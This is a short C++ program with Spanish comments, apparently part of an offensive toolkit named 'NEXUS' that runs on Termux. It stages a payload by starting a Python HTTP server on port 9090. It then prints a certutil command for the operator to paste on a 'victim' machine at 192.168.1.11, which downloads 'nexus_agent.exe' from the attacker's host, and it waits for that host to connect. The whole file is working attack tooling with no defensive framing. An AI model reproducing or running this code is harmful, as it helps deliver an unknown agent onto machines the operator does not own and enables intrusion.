#include <iostream>
#include <cstdlib>
#include <unistd.h>

int main() {
    std::string target = "192.168.1.11";
    std::cout << "\033[1;33m[*] NEXUS: Iniciando Fase de Transferencia...\033[0m" << std::endl;

    // 1. Levantar servidor de payloads en segundo plano (Puerto 9090)
    system("python3 -m http.server 9090 > /dev/null 2>&1 &");
    sleep(2); // Tiempo de estabilización de socket

    // 2. Generar el comando de descarga para la víctima (PowerShell/Certutil)
    std::cout << "\033[1;32m[!] COPIA Y PEGA EN EL OBJETIVO:\033[0m" << std::endl;
    std::cout << "certutil -urlcache -f http://$(hostname -I | awk '{print $1}'):9090/nexus_agent.exe agent.exe" << std::endl;

    // 3. Monitor de descarga (Watchdog)
    std::cout << "\033[1;34m[*] Esperando conexión desde " << target << "...\033[0m" << std::endl;
    
    // Alerta vocal de inicio
    system("termux-tts-speak 'Servidor de despliegue activo. Esperando descarga.'");

    return 0;
}
